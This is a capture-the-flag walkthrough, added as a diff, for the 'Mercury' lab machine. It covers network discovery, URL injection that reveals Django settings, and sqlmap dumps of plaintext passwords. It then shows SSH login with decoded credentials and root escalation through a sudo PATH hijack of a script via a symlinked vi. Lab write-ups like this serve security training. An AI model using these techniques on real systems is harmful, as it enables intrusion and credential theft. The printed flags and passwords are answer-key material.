@@ -1,0 +1,63 @@
+THE PLANETS: MERCURY
+
+0.- install vbox and add the downloaded machine
+
+1.- run the machine and get the ip
+    sudo netdiscover 
+    ip: 192.168.0.128
+
+2.- port scan
+    nmap -sV 192.168.0.128
+    22 ssh open
+    8080 http-proxy open
+
+3.- code injection
+    192.168.0.128:8080/$(whoami)
+    that returns django web and we get this
+    http://192.168.0.128:8080/mercuryfacts/
+    code injection again
+    192.168.0.128:8080/mercuryfacts/settings.py
+    now we get the following info:
+        user = webmaster
+        shell = /bin/bash
+        python3
+        backend = django
+        django.db.backends.mysql
+        secret key ********************
+4.- sql injection
+    sqlmap -u http://192.168.0.128:8080/mercuryfacts/ -dbs
+    we get 2 databases:
+    mercury, information_schema
+    sqlmap -u http://192.168.0.128:8080/mercuryfacts/ -D mercury --batch --dump-all
+    +----+-------------------------------+-----------+
+    | id | password                      | username  |
+    +----+-------------------------------+-----------+
+    | 1  | johnny1987                    | john      |
+    | 2  | lovemykids111                 | laura     |
+    | 3  | lovemybeer111                 | sam       |
+    | 4  | mercuryisthesizeof0.056Earths | webmaster |
+    +----+-------------------------------+-----------+
+    now we can ssh
+
+5.- ssh with given credentials
+
+    1st flag: [user_flag_8339915c9a454657bd60ee58776f4ccd]
+    webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+    linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg
+    echo "base64 string" | base64 -d :
+    webmaster:mercuryisthesizeof0.056Earths
+    linuxmaster:mercurymeandiameteris4880km
+    django SECRET_KEY = '8oi*5^zw#*genm@##7@65hs300g!(!*vy*05#!czdzppc$x7q6'
+
+6.- privilege scalation
+
+    su - linuxmaster
+    sudo -l
+    we got root permission to this file
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+    ln -s /usr/bin/vi tail
+    export PATH=$(pwd):$PATH
+    sudo --preserve-env=PATH /usr/bin/check_syslog.sh
+    :!/bin/bash
+    now we got a root shell and we got the root flag
+    2nd flag: [root_flag_69426d9fda579afbffd9c2d47ca31d90]
